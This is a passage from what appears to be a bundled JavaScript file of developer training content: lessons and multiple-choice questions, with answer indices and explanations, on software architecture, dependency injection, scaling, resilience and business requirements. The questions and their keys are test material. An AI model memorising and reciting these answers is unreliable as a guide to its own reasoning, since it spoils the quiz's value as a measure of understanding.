}`},choices:["It should throw InvalidOperationException, not NotSupportedException","The subclass breaks the base class promise, so it cannot replace it","Virtual methods are slow, so Save should not be overridden at all","Save should be async; then ReadOnlyStorage would work correctly"],answer:1,why:"Callers expect any `FileStorage` to save. `ReadOnlyStorage` breaks that promise (Liskov substitution). Better: a separate `IReadableStorage` and `IWritableStorage`.",remember:'A subclass that throws "not supported" is a warning sign.'},{id:"architecture.solid.2",kind:"scenario",difficulty:"medium",prompt:"An AI tool generated `IUserNameFormatter`, `UserNameFormatterFactory` and `DefaultUserNameFormatter` — just to join first and last name. There is one implementation and no plan for more. Keep it?",choices:["Yes, more interfaces always mean better design","Yes, SOLID requires an interface for every class","Probably not: a simple method is easier to read and change","No, it should be its own microservice"],answer:2,why:"Abstractions have a cost: more files and more jumps to understand simple code. With one implementation and no need to swap it, a plain method is enough. You can add the interface later if needed.",remember:"Abstraction has a cost. Add it when you need it."},{id:"architecture.solid.3",kind:"compare",difficulty:"medium",prompt:"Shipping cost: today there are 2 carriers. The business plans to add 6 more this year, each with its own rules. Which design fits better?",choices:["One method with a `switch` on the carrier name that keeps growing","An `IShippingCarrier` interface with one class per carrier"],answer:1,why:"Rules will grow and change often. One class per carrier keeps each carrier's rules apart and lets you add new ones without touching the old ones. For 2 fixed cases a switch would be fine."}]},{id:"architecture.di",title:"Dependency injection and lifetimes",summary:"Constructor injection — and the singleton + DbContext trap.",minutes:5,blocks:[{type:"text",text:"**Dependency injection (DI)** means a class does not create its own dependencies. It asks for them in the **constructor**, and the framework passes them in."},{type:"code",code:{lang:"csharp",text:`public class OrderService
{
    private readonly IPaymentGateway _payments;
    private readonly AppDbContext _db;

    // the DI container passes these in
    public OrderService(IPaymentGateway payments,
                        AppDbContext db)
    {
        _payments = payments;
        _db = db;
    }
}`}},{type:"text",text:"Why bother? In tests you pass a **fake** payment gateway instead of charging real cards. And all the wiring lives in one place (`Program.cs`) instead of `new` everywhere."},{type:"diagram",text:`Lifetime    One instance per...   Typical use
Singleton   whole app, forever    config, IMemoryCache
Scoped      HTTP request          DbContext
Transient   every injection       small stateless helpers`},{type:"text",text:"**The golden rule**: a service must not hold a dependency that lives **shorter** than itself."},{type:"code",code:{lang:"csharp",text:`builder.Services.AddDbContext<AppDbContext>(); // scoped
builder.Services.AddSingleton<PriceCache>();

public class PriceCache
{
    // ❌ the singleton keeps ONE DbContext forever
    public PriceCache(AppDbContext db) { /* ... */ }
}`}},{type:"list",items:['In Development, ASP.NET Core checks this and throws: "Cannot consume scoped service ... from singleton ...".',"Without that check, one `DbContext` is shared by all requests at once. `DbContext` is **not thread-safe** → random errors under load.","It also keeps tracking every entity it loaded → memory grows and data gets stale.","Fix: make `PriceCache` scoped, or inject `IDbContextFactory<AppDbContext>` / `IServiceScopeFactory` and create a short-lived context per operation."]}],remember:"Never let a singleton hold something scoped, like a DbContext.",questions:[{id:"architecture.di.1",kind:"debug",difficulty:"hard",prompt:'In production, under load, you see random errors: "A second operation was started on this context instance before a previous operation completed." With one user it works. What is the most likely cause?',code:{lang:"csharp",text:`builder.Services.AddDbContext<AppDbContext>();
builder.Services.AddSingleton<ReportService>();

public class ReportService
{
    public ReportService(AppDbContext db) { /* ... */ }
}`},choices:["SQL Server is overloaded","EF Core does not support async queries","The connection string is wrong in production","The singleton holds one DbContext that all requests share"],answer:3,why:"`ReportService` lives forever, so it keeps the first `DbContext` it got. All requests use that one instance at the same time, and `DbContext` is not thread-safe.",remember:"Singleton + DbContext = shared, unsafe, stale."},{id:"architecture.di.2",kind:"mcq",difficulty:"easy",prompt:"Which lifetime is usually right for an EF Core `DbContext` in a web API?",choices:["Singleton, so it is created only once","A static field shared by all classes","Scoped: one per HTTP request","Transient, created by hand in every method"],answer:2,why:"`AddDbContext` registers it as scoped by default. One context per request is short-lived, tracks only that request's data, and is never shared between threads."},{id:"architecture.di.3",kind:"scenario",difficulty:"easy",prompt:"Why does constructor injection make `OrderService` easier to unit test?",choices:["Tests can pass a fake `IPaymentGateway` instead of a real one","DI makes the code run faster, so tests finish in less time","Tests no longer need assertions, because DI checks the wiring","The DI container creates the test cases for each service"],answer:0,why:"The class does not decide which gateway it uses. A test gives it a fake that records the call, so no real card is charged and no network is needed."},{id:"architecture.di.4",kind:"code",difficulty:"medium",prompt:"What is the main design problem here?",code:{lang:"csharp",text:`public class OrderService
{
    public async Task PlaceAsync(Order o)
    {
        var gateway = new StripeGateway("sk_live_...");
        await gateway.ChargeAsync(o.Total);
    }
}`},choices:["Charging should happen in the constructor, not inside the method","It is hard-wired to Stripe with a live key: hard to test or change","Async methods are not allowed to create new objects with `new`","The method name `PlaceAsync` is too short to be clear to readers"],answer:1,why:"The class creates its own dependency, so a test would charge a real card. The secret key in code is a security problem too. Inject an `IPaymentGateway` and keep keys in configuration."}]},{id:"architecture.layers",title:"Layers and clean architecture",summary:"Keep business rules away from frameworks — when it pays.",minutes:4,blocks:[{type:"text",text:"**Layered architecture** splits code by job. Each layer only calls the one below it."},{type:"diagram",text:`Request
   ↓
API layer        controllers, DTOs, auth
   ↓
Business layer   rules: prices, discounts, stock
   ↓
Data layer       EF Core, SQL
   ↓
Database`},{type:"text",text:"**Clean architecture** (also called onion or hexagonal) changes one thing: the **business rules sit in the middle and depend on nothing**. The database, the web framework and email are details on the outside."},{type:"diagram",text:`┌──────────────────────────────────┐
│ Infrastructure: EF Core, SMTP,   │
│ Stripe, controllers              │
│  ┌────────────────────────────┐  │
│  │ Application: use cases,    │  │
│  │ interfaces (IOrderRepo)    │  │
│  │  ┌──────────────────────┐  │  │
│  │  │ Domain: Order, rules │  │  │
│  │  └──────────────────────┘  │  │
│  └────────────────────────────┘  │
└──────────────────────────────────┘
 Dependencies point INWARD only.`},{type:"code",code:{lang:"csharp",text:`// Application (inner) says what it needs
public interface IOrderRepository
{
    Task<Order?> GetAsync(int id);
}

// Infrastructure (outer) implements it with EF Core
public class EfOrderRepository : IOrderRepository
{ /* uses AppDbContext */ }`}},{type:"compare",left:{title:"Worth it when",items:["Business rules are complex and live for years","You want to test rules without a database","Several teams work on the code"]},right:{title:"Overkill when",items:["Simple CRUD: form in, row out","5 projects + a mapper for every field","A small internal tool or prototype"]}}],remember:"Rules in the middle, frameworks at the edge — and only as many layers as the problem needs.",questions:[{id:"architecture.layers.1",kind:"code",difficulty:"medium",prompt:"This class lives in the **Domain** project of a clean architecture solution. Which rule is broken?",code:{lang:"csharp",text:`using Microsoft.EntityFrameworkCore;

public class Order
{
    public void Ship(AppDbContext db)
    {
        Status = OrderStatus.Shipped;
        db.SaveChanges();
    }
}`},choices:["The Domain depends on an outer detail (EF Core)","Entities are not allowed to have methods","The Domain should use Dapper instead of EF Core","Nothing is broken, this is fine"],answer:0,why:"In clean architecture the domain knows nothing about databases. `Ship()` should only change the order's state; saving belongs to an outer layer."},{id:"architecture.layers.2",kind:"scenario",difficulty:"medium",prompt:"A small internal tool has 6 forms that save rows to 6 tables. The tech lead proposes 5 projects, CQRS, and mapping classes for every DTO. Your view?",choices:["Great: more layers and patterns always mean better code quality","Good idea, but split the 6 forms into 6 microservices instead","Fine: CQRS is required whenever an app writes to a database","Probably too heavy: the cost is bigger than the benefit here"],answer:3,why:"Layers pay off when rules are complex. For simple CRUD they mostly add files, mapping code and slower changes. A simple, well-organized app is the better fit.",remember:"Match the structure to the problem, not to a template."},{id:"architecture.layers.3",kind:"debug",difficulty:"medium",prompt:"A discount bug was fixed, but customers still see wrong discounts on some pages. You find the discount calculation copied inside 3 different controllers. What is the root problem?",choices:["The discounts table is missing an index, so old values are read","The rule is copied in controllers, not kept in one shared place","The controllers are not async, so they return stale discount data","There are too few controllers, so each one does too much work"],answer:1,why:"Rules in the API layer get copied, and fixes miss some copies. Put the discount rule in one place in the business/domain layer and call it from every controller."}]},{id:"architecture.monolith-microservices",title:"Monolith, modular monolith, microservices",summary:"Microservices are not automatically better.",minutes:5,blocks:[{type:"text",text:"**Microservices are not automatically better than a monolith.** They solve some problems and create new ones."},{type:"diagram",text:`               Monolith    Modular      Micro-
                           monolith     services
Deploys        1           1            many
Data           1 DB        1 DB, split  1 DB each
                           by module
Calls between  in-process  in-process   network
Fits           small team  most teams   many teams
Ops effort     low         low          high`},{type:"list",items:['**Monolith** — one app, one deploy. Simple to build, test, debug and deploy. Risk: it becomes a "big ball of mud" if nothing has clear boundaries.',"**Modular monolith** — still one deploy, but strong modules. Each module owns its data and exposes a small public API. A great default for most teams.","**Microservices** — separate apps, deployed and scaled on their own, talking over the network."]},{type:"compare",left:{title:"Microservices give you",items:["Teams deploy without waiting for each other","Scale one busy part alone","A failure can stay in one service"]},right:{title:"Microservices cost you",items:["Network calls that fail and add latency","No simple transaction across services","Tracing needed to debug one request","Many pipelines, dashboards, on-call"]}},{type:"example",title:"Quick check",text:"Your team has 3 developers and one small application. Do you need 20 microservices? Almost surely **no**. You would spend your time on deployments, network failures and data sync instead of features. Start with a modular monolith. Split out a service when you have a real reason: a separate team, a part that needs to scale alone, a very different release speed."},{type:"text",text:"Warning sign: the **distributed monolith** — services that share one database or must be deployed together. You pay all the microservice costs and get none of the benefits."}],remember:"Microservices solve team and scaling problems. Without those problems, you only get the costs.",questions:[{id:"architecture.monolith-microservices.1",kind:"scenario",difficulty:"easy",prompt:"Your team has 3 developers and one small application. Do you need 20 microservices?",choices:["Yes, microservices are the modern standard","Yes, as long as each one has its own database","No: a (modular) monolith is simpler and fits this team","Yes, smaller services always have fewer bugs"],answer:2,why:"With 3 people, 20 services means each person runs about 7 deployables, plus network and data problems. The benefits of microservices (independent teams, separate scaling) do not exist here yet.",remember:"Start simple. Split when you have a real reason."},{id:"architecture.monolith-microservices.2",kind:"debug",difficulty:"medium",prompt:'A company has 12 "microservices". All of them use the same database, and every release must deploy all 12 together in a fixed order. What is this?',choices:["A distributed monolith: the costs without independent deploys","A textbook microservice design, since each service has its own code","A modular monolith, since all the modules share one database","A serverless architecture, because the services share one platform"],answer:0,why:"The main benefit of microservices is deploying and changing them independently. A shared database and locked releases remove that benefit, but the network and ops costs stay."},{id:"architecture.monolith-microservices.3",kind:"compare",difficulty:"hard",prompt:"40 developers in 5 teams work on one app. Search gets 50× more traffic than everything else, and teams keep blocking each other on releases. Which direction fits better?",choices:["Keep one deployable with one shared release for all 5 teams","Split out a few services along team/business lines, search first"],answer:1,why:"Now there are real reasons to split: teams block each other, and one part needs to scale alone. Split a few services along clear boundaries, not 50 tiny ones."},{id:"architecture.monolith-microservices.4",kind:"perf",difficulty:"medium",prompt:"After splitting a monolith into services, the product page now calls 8 services one after another. It went from 80 ms to 900 ms. Most likely cause?",choices:["The JSON responses became bigger and take longer to parse","Each service runs on a slower CPU than the old monolith did","The database lost its indexes when the tables were split up","Network hops: each call adds latency, and they run in sequence"],answer:3,why:"In-process calls cost microseconds; network calls cost milliseconds each, plus serialization. Eight calls in a row add up. Call in parallel where possible, or rethink the boundaries.",remember:"Every service boundary is a network call."}]},{id:"architecture.scaling",title:"Scaling: up, out and stateless",summary:"Bigger server or more servers — and what breaks.",minutes:5,blocks:[{type:"text",text:`**Vertical scaling (scale up)** = a bigger machine.
**Horizontal scaling (scale out)** = more machines behind a load balancer.`},{type:"compare",left:{title:"Scale up",items:["No code changes","Still one simple server","Has a ceiling and gets expensive","One server = one point of failure"]},right:{title:"Scale out",items:["Add servers as traffic grows","One server dies, others continue","The app must be stateless","More moving parts"]}},{type:"diagram",text:`            ┌─► API #1 ─┐
Users ─► LB ┼─► API #2 ─┼─► DB / Redis
            └─► API #3 ─┘
LB = load balancer: spreads requests and
skips servers that fail their health check`},{type:"text",text:"**Stateless** means the server keeps nothing important in its own memory between requests. Request 1 may go to API #1, request 2 to API #3. Sessions, carts and uploaded files must live in a shared place: database, Redis, blob storage."},{type:"example",title:"Classic bug",text:"Login works, then the user is randomly logged out. The session was stored in memory on API #1. The next request went to API #2, which never saw it."},{type:"text",text:`**Caching** keeps a copy of expensive results close by. Trade-off: the copy can be **stale** (old). Decide how old is OK: prices maybe seconds, product descriptions maybe hours.
An in-memory cache is per server — 3 servers = 3 separate copies. A shared cache (like Redis) gives one copy, but adds a network call.`},{type:"text",text:"**Queues** help too: put slow work (emails, PDFs) on a queue, answer the user fast, and let workers catch up. (More in Distributed Systems.)"}],remember:"Scale out needs stateless servers. A cache trades freshness for speed.",questions:[{id:"architecture.scaling.1",kind:"debug",difficulty:"medium",prompt:"You go from 1 to 3 API servers behind a load balancer. Now users are randomly logged out and their carts are sometimes empty. Cause?",choices:["The load balancer removes the login cookie from some requests","Sessions and carts are in server memory; requests hit other servers","Three servers open too many connections for one database","The users' browsers block cookies that come from more than one server"],answer:1,why:"With one server, in-memory state always worked. With three, the next request may land on a server that does not have it. Move the state to a shared store (DB, Redis).",remember:"Scale out → keep state out of server memory."},{id:"architecture.scaling.2",kind:"scenario",difficulty:"easy",prompt:"Black Friday is in 2 weeks; traffic will be about 5×. The app is stateless, runs on 2 servers, and the database has spare capacity. What is the simplest step?",choices:["Rewrite the app as microservices so each part can scale alone","Move to a faster database engine before the traffic arrives","Add more app servers behind the load balancer, then load test","Turn off all logging to free CPU for the extra traffic"],answer:2,why:"A stateless app scales out easily: add servers. A load test tells you if it really holds 5× and where the next bottleneck is."},{id:"architecture.scaling.3",kind:"debug",difficulty:"hard",prompt:"Prices are cached in `IMemoryCache` for 10 minutes on each of 4 servers. An admin changes a price. For a few minutes, users see the old and new price switch back and forth when they refresh. Why?",choices:["The database returns old and new rows while the update commits","`IMemoryCache` is not thread-safe, so reads can return mixed values","The browser cache mixes the old and new price on each refresh","Each server has its own copy, and they expire at different times"],answer:3,why:"Each server cached the price at a different moment. Until every copy expires, the load balancer sends users to servers with old or new data. Use a shared cache or remove the key on update."},{id:"architecture.scaling.4",kind:"compare",difficulty:"medium",prompt:"An admin dashboard used by 5 people runs on one small VM. Once a month a big report pushes CPU to 100%. Which first move fits better?",choices:["Use a bigger VM, or make the report query cheaper","Rebuild it to run on 10 servers with Redis and a load balancer"],answer:0,why:"Five users and one heavy report do not need a scale-out design. Scaling up or fixing the report is cheap and quick. Scale out when you really need it."}]},{id:"architecture.resilience",title:"Resilience and observability",summary:"Expect failure, and be able to see it.",minutes:5,blocks:[{type:"text",text:`In production things **will** fail: a slow database, a payment API that is down, a full disk.
**Resilience** = the system keeps working, maybe with less, when one part fails.`},{type:"diagram",text:`Recommendations API slow (30 s)
  ↓  no timeout
Every product page request waits 30 s
  ↓
Threads and connections all busy
  ↓
Login and search stop too 💥
(one slow part took down everything)`},{type:"list",items:["**Timeouts** — never wait forever. `HttpClient` waits 100 seconds by default; most calls should give up much sooner.","**Circuit breaker** — after many failures, stop calling the broken service for a while. Fail fast instead of piling up waiting requests.","**Fallback** — recommendations down? Show the page without them.","**Bulkhead** — limit how many connections one dependency can use, so one slow part cannot sink the whole ship."]},{type:"text",text:"**Observability** = can you understand what the system is doing from the outside? Three main signals:"},{type:"list",items:['**Logs** — what happened to one thing. "Order 512 failed: card declined."',"**Metrics** — numbers over time. Error rate 4%, p99 1.2 s, CPU 70%.",'**Traces** — one request across services, with the time of each step. "The DB call took 900 ms of the 1 s."']},{type:"text",text:"Trade-off: every resilience tool adds complexity, and every signal costs money (storage, tools). Start with timeouts, health checks and basic metrics. Add more where failures really hurt."}],remember:"Expect failure: timeouts, fallbacks, circuit breakers. Logs say what, metrics say how much, traces say where.",questions:[{id:"architecture.resilience.1",kind:"debug",difficulty:"hard",prompt:"The recommendations service becomes slow. Minutes later the whole website, including login, stops responding. Calls to recommendations have no timeout. What happened?",choices:["Login secretly calls the recommendations service on every sign-in","Requests piled up waiting and used up shared threads and connections","The load balancer crashed on its own at the same time, by chance","The slow service sent back bad data that crashed the login code"],answer:1,why:"Without a timeout, every request that touches recommendations waits a long time. They hold threads and connections, so even unrelated requests like login cannot get them. This is a cascading failure.",remember:"No timeout = one slow dependency can stop everything."},{id:"architecture.resilience.2",kind:"scenario",difficulty:"easy",prompt:"The product page shows recommendations from another service. That service is down. What should the product page do?",choices:["Show an error page to the user","Retry forever until the service is back","Redirect the user to the home page","Show the product without recommendations"],answer:3,why:"Recommendations are nice to have; the product itself is what matters. Graceful degradation keeps the main job working when an extra part fails."},{id:"architecture.resilience.3",kind:"mcq",difficulty:"medium",prompt:"One request is slow, and it passes through 4 services. Which signal shows best **where** the time is spent?",choices:["The logs of the API gateway only","The CPU metric of one server","A distributed trace of that request","The overall error rate metric"],answer:2,why:"A trace records each step of one request with its duration, across services. You can see at once which call took 900 ms."},{id:"architecture.resilience.4",kind:"scenario",difficulty:"hard",prompt:"The payment API has failed every call for 3 minutes. Each checkout still waits 10 s for the timeout before it fails. What helps users and the system most?",choices:["A circuit breaker: fail fast for a while, then try again","Raise the timeout to 60 s so calls have more time","Remove the timeout completely","Add more log lines around the payment call"],answer:0,why:"When a service is clearly down, waiting 10 s per request only wastes resources and users' time. A circuit breaker fails fast, then lets a test call through later to see if the service is back."}]}],cheatSheet:[{title:"Design basics",items:[{term:"Coupling",meaning:"How much parts depend on each other — keep it low"},{term:"Cohesion",meaning:"How well code in one part belongs together — keep it high"},{term:"SOLID",meaning:"Five design questions, not laws"},{term:"Abstraction",meaning:"Has a cost — add it when it pays for itself"},{term:"Another module's tables",meaning:"Its internals — use its API instead"}]},{title:"Dependency injection (.NET)",items:[{term:"Constructor injection",meaning:"Ask for dependencies; do not `new` them"},{term:"Singleton",meaning:"One per app — must be thread-safe"},{term:"Scoped",meaning:"One per HTTP request — e.g. DbContext"},{term:"Transient",meaning:"New one every time it is injected"},{term:"Singleton → Scoped",meaning:"Bug: captured, shared, stale. Use a factory or scope"}]},{title:"Structure",items:[{term:"Layered",meaning:"API → business → data; each calls the one below"},{term:"Clean architecture",meaning:"Domain in the middle, dependencies point inward"},{term:"Modular monolith",meaning:"One deploy, strong modules — good default"},{term:"Microservices",meaning:"Independent deploy and scale — high ops cost"},{term:"Distributed monolith",meaning:"Shared DB or deployed together — worst of both"}]},{title:"Running at scale",items:[{term:"Scale up",meaning:"Bigger machine — simple, has a ceiling"},{term:"Scale out",meaning:"More machines — needs stateless servers"},{term:"Load balancer",meaning:"Spreads requests, skips unhealthy servers"},{term:"Cache",meaning:"Faster, but may be stale; in-memory = per server"},{term:"Timeout / circuit breaker",meaning:"Do not wait forever; fail fast when a service is down"},{term:"Logs / metrics / traces",meaning:"What happened / how much / where the time went"}]}]},d=Object.freeze(Object.defineProperty({__proto__:null,default:n},Symbol.toStringTag,{value:"Module"})),h={id:"business",title:"Business Thinking",emoji:"🧩",tagline:"Understand the problem before the code",lessons:[{id:"business.ask-why",title:'Ask "Why?" before "How?"',summary:"A request is a solution. Find the problem behind it.",minutes:3,blocks:[{type:"text",text:`Requests usually arrive as a **solution**: "Add an Export to Excel button."
Behind every solution is a **problem**. If you know the problem, you can build something simpler, or something that actually helps.`},{type:"diagram",text:`Request (a solution)  "Add an Excel export"
        ↓ why?
Goal                  "My boss checks weekly sales"
        ↓ why?
Real need             "Know early if we miss target"
        ↓
Options: export? dashboard? weekly email? alert?`},{type:"example",title:"The Excel button",text:"Maybe the Excel export is still the right answer. But now you know **who** reads it and **why**, so you can choose the right columns, filters and format."},{type:"list",items:["What problem does this solve?","Who uses it, and how often?","What do they do today without it?","How will we know it worked?"]},{type:"text",text:`Asking why is not refusing work. Say it kindly: "Help me understand the goal, so I build the right thing."
And know when to stop: some answers are **hard constraints** (a law, a contract). Then you stop asking why and ask for the **exact rule**.`}],remember:"A request is a solution. Find the problem behind it.",questions:[{id:"business.ask-why.1",kind:"scenario",difficulty:"easy",prompt:'The product owner asks: "Add a field so admins can set any order’s status by hand." What is the best first question?',choices:['"Should it be a dropdown or a text box?"','"What situation makes admins need this today?"','"Can we finish it in one day?"','"Which role should see the button?"'],answer:1,why:'Setting any status by hand can skip payment or stock steps. If the real problem is "orders get stuck", a safer fix like "retry stuck order" may be better.'},{id:"business.ask-why.2",kind:"scenario",difficulty:"medium",prompt:'Support asks for a "resend invoice email" button. You ask why. They say many customers never get the invoice, and most of those emails land in spam. What does this tell you?',choices:["Build the button exactly as asked and close the ticket","Support is wrong; the emails are delivered fine","Stop sending invoice emails completely","The real problem is email delivery; a download link may help more"],answer:3,why:"Resending to spam fixes little. Knowing the cause lets you fix email delivery, or give customers another way to get the invoice. The button may still be useful, but it is not the main fix.",remember:"Fix the cause, not only the symptom."},{id:"business.ask-why.3",kind:"mcq",difficulty:"hard",prompt:'A manager says: "Make the dashboard real-time." Which question best finds the real need?',choices:['"Which WebSocket library should we use for the live updates?"','"Is a refresh every second real-time enough for you?"','"When a number changes, what do you do, and how fast?"','"Should we also build a mobile app with push notifications?"'],answer:2,why:"If the manager looks once an hour, refreshing every 5 minutes is plenty — much cheaper than true real-time. The decision they make sets the speed you need."},{id:"business.ask-why.4",kind:"scenario",difficulty:"hard",prompt:'A stakeholder says: "Invoices must keep their number forever, even if cancelled. It is a tax rule." You do not see why. What is the right move?',choices:["Keep asking why until you agree with the rule","Treat it as a hard constraint, and ask for the exact rule","Ignore it — deleting cancelled invoices is cleaner","Build it, but delete old invoices in a nightly job"],answer:1,why:"Some whys end at a law or a contract. You do not need to agree, but you need the exact details (which countries, how long to keep them) to build it correctly.",remember:'When "why" hits a law, ask for the exact rule.'}]},{id:"business.language",title:"Speak the domain language",summary:"Same word, same meaning — in meetings and in code.",minutes:3,blocks:[{type:"text",text:'Every business has its own words: "order", "customer", "active", "closed". The trap: the **same word often means different things** to different people.'},{type:"example",title:'What is an "active user"?',text:`Marketing: logged in during the last 30 days.
Billing: has a paid plan.
Support: account is not blocked.
A dashboard that says "Active users: 12,400" means nothing until you know which one.`},{type:"text",text:'Fix: agree on one meaning, and **use the same word in the code**. If the business says "Booking", do not call the class `Reservation` and the table `Slot`. Domain-Driven Design calls this a **ubiquitous language**: one shared vocabulary for people and code.'},{type:"code",code:{lang:"csharp",text:`// Hard to follow: whose words are these?
if (u.Flag2 && u.Days < 3) Notify(u);

// Uses the words the business uses
if (customer.IsOnTrial && customer.TrialDaysLeft < 3)
    SendTrialEndingReminder(customer);`}},{type:"list",items:["Keep a small **glossary**: term, meaning, example, who owns it.",'When a word is fuzzy, ask: "When you say X, do you mean A or B?"','Watch out for words like "date", "closed", "total" — they hide many meanings.']}],remember:"Agree on what a word means, then use that exact word in code.",questions:[{id:"business.language.1",kind:"debug",difficulty:"medium",prompt:'Two reports show a different "number of customers": 8,200 and 11,500. Both SQL queries run without errors. What is the most likely cause?',choices:["The database is corrupted",'They use different meanings of "customer"',"One report runs on a slower server","One of the reports is cached for too long"],answer:1,why:'One query may count everyone who registered, the other only people who ordered. Both are "correct" — for different definitions. Agree on one and name it clearly.'},{id:"business.language.2",kind:"mcq",difficulty:"easy",prompt:'The business says "Booking". The code says `Reservation`, the API says `Appointment` and the table is `Slot`. What is the main cost?',choices:["Every talk needs translation, and mix-ups become bugs","The app gets slower, because it maps between the four names","The database needs extra joins to link the different tables","No real cost, as long as each layer is consistent inside"],answer:0,why:'People must translate between four names all the time. New developers get lost, and a requirement about "bookings" may be built in the wrong place.'},{id:"business.language.3",kind:"scenario",difficulty:"medium",prompt:'The requirement says: "Close the account when the user asks." What should you clarify first?',choices:['"Should the Close button be red, and need a second click?"','"Should we use DELETE or POST for the close-account endpoint?"','"Should we send the user an email after the account is closed?"','"Does close mean deactivate it, or delete the data for good?"'],answer:3,why:'"Close" can mean two very different things. One is reversible, the other is permanent and may have legal rules. The rest of the design depends on this answer.',remember:"Fuzzy verbs (close, remove, cancel) hide big decisions."},{id:"business.language.4",kind:"code",difficulty:"hard",prompt:'The rule is: "Invoices are due 30 days after the invoice date." A developer writes this. What should you question?',code:{lang:"csharp",text:"invoice.DueDate = invoice.CreatedAt.AddDays(30);"},choices:["Whether `AddDays` should be `AddHours`",'Whether "invoice date" is the same as when the row was created',"Whether 30 should be a named constant","Whether `DateTime` is slower than `DateTimeOffset`"],answer:1,why:'`CreatedAt` is when the system saved the row. The "invoice date" is a business date: an invoice can be entered days later, or dated on purpose. Mixing them gives wrong due dates.'}]},{id:"business.edge-cases",title:'Business edge cases: "What if…?"',summary:"Requirements describe the happy path. Real life does not.",minutes:4,blocks:[{type:"text",text:'Requirements describe the **happy path**. Real life adds "what if…". Your job is to find those questions **before** users find them in production.'},{type:"example",title:'"Users cannot edit a published scenario."',text:`Good questions to ask:
• What if it is **being processed** right now?
• Can they unpublish, edit, then publish again?
• Can an admin still edit it?
• Is fixing a typo in the title an "edit"?
• What happens to results made with the old version?`},{type:"list",items:["**In progress** — what if it is half done (processing, half paid)?","**At the same time** — what if two people do it at once?","**Late** — what if it happens 1 minute after the deadline?","**Reversed** — cancel, refund, undo — after part of it already happened?","**Money** — rounding, a discount bigger than the price, currency.","**People** — the user is deleted, changes role, or leaves the company."]},{type:"text",text:'Edge cases are often **business decisions**, not technical ones. Do not decide alone. Write the question, suggest an answer, and get a "yes" from the person who owns the rule.'},{type:"compare",left:{title:"Decide silently ⚠️",items:["Fast today","Surprise later","The rule is hidden in code"]},right:{title:"Ask and write it down ✅",items:["Small delay","Everyone agrees","Becomes a test case"]}}],remember:"For each rule ask: what if it is in progress, at the same time, late, or reversed?",questions:[{id:"business.edge-cases.1",kind:"scenario",difficulty:"medium",prompt:'Rule: "Users cannot edit a published scenario." Anna opens the edit page. While she types, a colleague publishes the scenario. Anna clicks Save. What should you do as the developer?',choices:["Allow the save — she started before it was published","Silently throw away her changes","Check the state on the server at save time, and ask the PO what Anna should see","Block publishing while anyone has the page open, without asking"],answer:2,why:"The server must check the rule when saving, not only when the page opens. What Anna sees (an error, a copy as draft…) is a business decision, so ask."},{id:"business.edge-cases.2",kind:"scenario",difficulty:"hard",prompt:'Rule: "Customers can cancel an order for a full refund before it ships." An order has 3 items: 2 have shipped, 1 has not. The customer clicks Cancel. What is the best next step?',choices:["Refund everything — the rule says full refund","Notice the rule does not cover this, and ask the business","Refuse — part of the order has already shipped","Ship the last item faster so the question goes away"],answer:1,why:'Partial shipment is not covered by the rule. Options like "cancel and refund only the unshipped item" are business choices with money involved. Ask, then write the answer into the rule.',remember:"A rule that does not cover a case is a question, not a guess."},{id:"business.edge-cases.3",kind:"scenario",difficulty:"easy",prompt:'A new promo: "10 € off any order." A user orders a single item that costs 8 €. Which edge case must the business decide?',choices:["The order total could go below zero","The promo code might be typed in lowercase","The page might load a little slower","The user might not like the item"],answer:0,why:"Without a rule, the total becomes −2 €. Should the total stop at 0? Is there a minimum order value? That is a business decision, not a coding detail."},{id:"business.edge-cases.4",kind:"compare",difficulty:"medium",prompt:"On Friday afternoon you find an edge case the requirement does not cover. Which is better?",choices:["Choose a safe default, write the question down, and get the owner to confirm it","Choose a behavior and tell nobody — it is just a small detail"],answer:0,why:'Silent choices become hidden business rules that nobody agreed on. Writing the question down lets the business say "no, do it differently" before customers notice.'}]},{id:"business.invariants",title:"Invariants: rules that are always true",summary:"Protect them close to the data.",minutes:4,blocks:[{type:"text",text:"An **invariant** is a rule that must be true **at all times**, no matter which screen, API, job or script changed the data."},{type:"list",items:["An order’s total equals the sum of its lines.","A concert seat is booked by at most one person.","A transfer never creates or destroys money.","A published scenario has at least one step."]},{type:"text",text:"If the rule lives only in the UI, an API call, an import job or an admin script can break it. Put it **close to the data**."},{type:"diagram",text:`UI check       → nice for users, easy to skip
API validation → better, but jobs can skip it
Domain object  → every code path goes through it
DB constraint  → last safety net (UNIQUE, CHECK, FK)`},{type:"code",code:{lang:"csharp",text:`public class Order
{
    private readonly List<OrderLine> _lines = new();
    public OrderStatus Status { get; private set; }
    public decimal Total { get; private set; }

    public void AddLine(OrderLine line)
    {
        if (Status != OrderStatus.Draft)
            throw new InvalidOperationException(
                "Only draft orders can change.");
        _lines.Add(line);
        Total = _lines.Sum(l => l.Price * l.Quantity);
    }
}`}},{type:"text",text:'Watch out for **two requests at once**. Both can check "seat is free", and both can book it. Only an atomic check (a unique constraint, a lock, or a conditional update) keeps the rule true under load.'}],remember:"A rule checked in only one screen is a suggestion, not an invariant.",questions:[{id:"business.invariants.1",kind:"debug",difficulty:"medium",prompt:'Rule: "Each seat can be sold once." The code does `if (!seatTaken) Book(seat);`. Under heavy load a few seats are sold twice. What is the most likely cause?',choices:["Two requests both checked before either one saved","The database server is too slow","The user double-clicked in the same browser tab","The UI shows the wrong seat map"],answer:0,why:"This is a race condition: check-then-act is not atomic. A unique constraint on (ConcertId, SeatId) makes the second booking fail, whatever the timing.",remember:"Check-then-act is not safe under load."},{id:"business.invariants.2",kind:"scenario",difficulty:"medium",prompt:'The rule "a discount cannot be more than 50%" is checked only in the React form. Where can it still be broken?',choices:["Nowhere — the form validation blocks any value above 50%","Only in old browsers that do not run the React form checks","Any path that skips the form: API calls, imports, scripts","Only in automated tests that fill the form with bad data"],answer:2,why:"The form is one door. The API, CSV imports and admin scripts are other doors. Enforce the rule on the server or in the domain model; keep the UI check for a nice user experience."},{id:"business.invariants.3",kind:"code",difficulty:"hard",prompt:'Rule: "An order’s Total always equals the sum of its lines." What is the risk in this design?',code:{lang:"csharp",text:`public class Order
{
    public List<OrderLine> Lines { get; set; } = new();
    public decimal Total { get; set; }
}

// somewhere else
order.Lines.Add(newLine);
